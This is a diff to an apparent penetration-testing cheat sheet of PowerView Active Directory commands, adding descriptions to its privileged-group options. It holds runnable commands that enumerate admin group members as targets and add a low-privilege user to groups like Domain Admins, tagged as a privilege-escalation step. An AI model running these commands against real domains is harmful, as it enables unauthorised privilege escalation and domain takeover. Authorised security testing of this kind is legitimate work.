@@ -18,7 +18,7 @@ Get-DomainUser -Identity {{TARGET_USER:str:Administrator}} -Properties samaccoun
 Return all (or a specified) domain groups.
 
 ```bash
-Get-DomainGroup -Identity '{{GROUP:choice:Domain Admins,Enterprise Admins,Administrators,Schema Admins,Backup Operators,Server Operators,Account Operators,Print Operators,DnsAdmins,Group Policy Creator Owners,Remote Desktop Users,Domain Users,Domain Computers,Domain Controllers}}'
+Get-DomainGroup -Identity '{{GROUP:choice:Domain Admins=full domain rights,Enterprise Admins=forest-wide rights,Administrators=local admin group,Schema Admins=schema modification rights,Backup Operators=backup/restore rights,Server Operators=server management,Account Operators=user account mgmt,Print Operators=printer management,DnsAdmins=DNS admin (RCE-prone),Group Policy Creator Owners=GPO creation,Remote Desktop Users=RDP access,Domain Users=all domain accounts,Domain Computers=all domain hosts,Domain Controllers=all DCs}}'
 ```
 
 <!-- meta: risk=low | phase=enum | tags=groups,enum -->
@@ -29,7 +29,7 @@ Get-DomainGroup -Identity '{{GROUP:choice:Domain Admins,Enterprise Admins,Admini
 List the members of a domain group — run against privileged groups to find operators worth targeting.
 
 ```bash
-Get-DomainGroupMember -Identity '{{GROUP:choice:Domain Admins,Enterprise Admins,Administrators,Schema Admins,Backup Operators,Server Operators,Account Operators,Print Operators,DnsAdmins,Group Policy Creator Owners,Remote Desktop Users,Domain Users,Domain Computers,Domain Controllers}}' | select MemberName,MemberSID
+Get-DomainGroupMember -Identity '{{GROUP:choice:Domain Admins=full domain rights,Enterprise Admins=forest-wide rights,Administrators=local admin group,Schema Admins=schema modification rights,Backup Operators=backup/restore rights,Server Operators=server management,Account Operators=user account mgmt,Print Operators=printer management,DnsAdmins=DNS admin (RCE-prone),Group Policy Creator Owners=GPO creation,Remote Desktop Users=RDP access,Domain Users=all domain accounts,Domain Computers=all domain hosts,Domain Controllers=all DCs}}' | select MemberName,MemberSID
 ```
 
 <!-- meta: risk=low | phase=enum | tags=groups,members,enum -->
@@ -447,7 +447,7 @@ Add-DomainObjectAcl -TargetIdentity '{{DOMAIN:domain:corp.local}}' -PrincipalIde
 Add a principal to a privileged group — common finalization step after an ACL win.
 
 ```bash
-Add-DomainGroupMember -Identity '{{GROUP:choice:Domain Admins,Enterprise Admins,Administrators,Schema Admins,Backup Operators,Server Operators,Account Operators,Print Operators,DnsAdmins,Group Policy Creator Owners,Remote Desktop Users,Domain Users,Domain Computers,Domain Controllers}}' -Members {{TARGET_USER:str:lowpriv}} -Verbose
+Add-DomainGroupMember -Identity '{{GROUP:choice:Domain Admins=full domain rights,Enterprise Admins=forest-wide rights,Administrators=local admin group,Schema Admins=schema modification rights,Backup Operators=backup/restore rights,Server Operators=server management,Account Operators=user account mgmt,Print Operators=printer management,DnsAdmins=DNS admin (RCE-prone),Group Policy Creator Owners=GPO creation,Remote Desktop Users=RDP access,Domain Users=all domain accounts,Domain Computers=all domain hosts,Domain Controllers=all DCs}}' -Members {{TARGET_USER:str:lowpriv}} -Verbose
 ```
 
 <!-- meta: risk=high | phase=exploit | tags=group,addmember,privesc -->
